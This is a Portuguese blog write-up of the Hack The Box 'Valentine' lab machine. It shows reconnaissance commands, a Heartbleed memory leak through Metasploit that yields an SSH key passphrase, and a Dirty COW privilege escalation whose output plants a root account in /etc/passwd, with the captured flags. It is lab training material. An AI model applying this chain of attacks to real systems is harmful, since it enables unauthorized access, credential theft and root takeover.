---
layout: post
title: Valentine [Hack The Box] - Hearthbleed
author: obrerodrigues
categories: [CTFs]
tags: [Hack The Box]
---
![](https://github.com/brerodrigues/brerodrigues.github.io/raw/master/assets/img/valentine.png)

Essa máquina foi bem fácil e básica, bastou ser um bom script kiddie para conseguir um root fácil. Demorei muito mais tempo que o necessário por não ter percebido algo óbvio que irei citar ao longo do post. A parte mais interessante foi poder explorar e ver na prática a falha Hearthbleed.

Acessando o IP da Valentine no chrome nos leva a uma página estática com uma imagem familiar para quem ficou ligado em notícias de segurança nos últimos tempos. Nela tem a logo de uma vulnerabilidade bem pop e sacar isso já daria meio caminho andado para a flag do user.

Rodei o nmap (nmap -v -A -oN nmap.txt 10.10.10.79) e vi a porta 80/443 com o apache/ssl e a 22 com ssh. E ao mesmo tempo que o nmap, meu dirbuster achou o diretório http://10.10.10.79/dev.

No diretório /dev haviam os arquivos: hype_key e notes.txt.

No notes.txt o conteúdo era:
```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

Nesse momento ainda não sabia que porra poderia ser o decoder/encoder, mas guardei essa informação.

Já em hype_key tinha um bocado de hexadecimais que, ao usar esse site http://www.unit-conversion.info/texttools/hexadecimal/, converti para algo bastante interessante:

<script src="https://gist.github.com/brerodrigues/1bc4113bdb9233ce2270fe1afbe864ef.js"></script>

Uma chave privada! Com certeza deve servir para alguma coisa mas ainda não dava para saber.

Então guardei a chave e abri o metasploit porque tive preguiça. Se você precisou se perguntar a razão de eu abrir o metasploit é porque não se ligou que a imagem da página principal faz referência ao "[heartbleed bug](https://brerodrigues.github.io/hacking/o-famoso-e-aterrorizante-bug-heartbleed "heartbleed bug")".

Voltando a meu metasploit, peguei o exploit do heartbleed, configurei o alvo e outros pequenos detalhes que deixo para você adivinhar e rodei sem mesmo precisar checar e o servidor começou a cuspir conteúdo da memória como deveria. Rodei o exploit mais de uma vez procurando por algo facilmente vísivel. Então em meio a um monte de porcaria eu vi isso:

```
......Z..PN..v............2..{p.]4W.$:..f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................ux i686; rv:45.0) Gecko/20100101 Firefox/45.0..Referer: https://127.0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..U!....c.@..Au..'...............cation/x-www-form-urlencoded..Content-Length: 9....text=asas...K..<y...v.._.
```

Aparentava ser uma requisição http para o tal /decode.php e mais embaixo há a variavel $text com o base64: aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

Entrando em http://10.10.10.79/decode.php vi que era um simples decodificador para base64. Era disso que o arquivo notes.txt fazia menção e a requisição faz total sentido. Usei o mesmo para decodificar o valor que peguei com o exploit e obtive o resultado: heartbleedbelievethehype

Temos em mãos uma chave privada e um valor obtido explorando o servidor. O que fazer?

Assim que vi a chave privada pensei em usar direto no servidor SSH, mas sem saber o nome de usuário não rolava. Fiquei viajando por um tempo até perceber o nome do arquivo onde estava a chave em hexadecimal: hype_key.

A chave deveria pertencer ao hype e heartbleedbelievethehype poderia muito bem ser um password.

```
brenno@budweiser ~/D/c/h/valentine> ssh -i new2/hype.txt hype@10.10.10.79
Enter passphrase for key 'new2/hype.txt': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Jul 15 18:26:44 2018 from 10.10.15.248
```

Boa! Hora de pegar a flag do user.txt

```
hype@Valentine:~$ cd Desktop/
hype@Valentine:~/Desktop$ ls
user.txt
hype@Valentine:~/Desktop$ cat user.txt
e6710a5464769fd5fcd216e076961750
```

A escalação de privilégios foi bem simples porque a máquina tava rodando um kernel desatualizado:

```
hype@Valentine:~$ uname -r
3.2.0-23-generic
```

Verificar o kernel é quase sempre a primeira coisa que faço porque caso encontre um desses é fácilimo conseguir root. Com uma pesquisa rápida no Google por essa versão se descobre que é vulnerável ao famigerado [dirtycow](https://pt.wikipedia.org/wiki/Dirty_COW "dirtycow").

Então, usei esta versão do exploit: https://ro.0day.today/exploit/26430 e w00t w00t. Se for usar, não esqueça de modificar pelo amor de deus.

Compilando no meu super ultra secreto diretório:
```
hype@Valentine:/tmp/.obrerodrigues$ gcc -pthread poc.c -o dir -lcrypt
```
Rodando e escolhendo um password seguro para uma conta que tem privilégios root:
```
hype@Valentine:/tmp/.obrerodrigues$ ./dir
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
ieatworld:iePFiy4QljHQk:0:0:pwned:/root:/bin/bash

mmap: 7ff5325d2000

madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'ieatworld' and the password '123457'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'ieatworld' and the password '123457'.
```
Hora de logar e pegar a flag root:
```
hype@Valentine:/tmp/.obrerodrigues$ 
hype@Valentine:/tmp/.obrerodrigues$ 
hype@Valentine:/tmp/.obrerodrigues$ su ieatworld
Password: 
ieatworld@Valentine:/tmp/.obrerodrigues# whoami
ieatworld
ieatworld@Valentine:/tmp/.obrerodrigues# ls /root
curl.sh  root.txt
ieatworld@Valentine:/tmp/.obrerodrigues# cat /root/root.txt
f1bb6d759df1f272914ebbc9ed7765b2
```
E só por curiosidade, que tal descobrir o que tem nesse arquivo curl?
```
ieatworld@Valentine:/tmp/.obrerodrigues# cat /root/curl.sh
/usr/bin/curl -i -s -k  -X 'POST' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Referer: https://127.0.0.1/decode.php' -H 'Content-Type: application/x-www-form-urlencoded' \
    -b 'PHPSESSID=n12acqnj0efoq5etm5d12k6j85' \
    --data-binary $'text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' \
    'https://127.0.0.1/decode.php' >  /dev/null 2>&1
```
Olha só, é a requisição que peguei com o hearthbleed. Provavelmente havia um cronjob rodando esse script e tal.

E com dois exploits de vulnerabilidades pops e um pouco de atenção foi possível obter as flags.
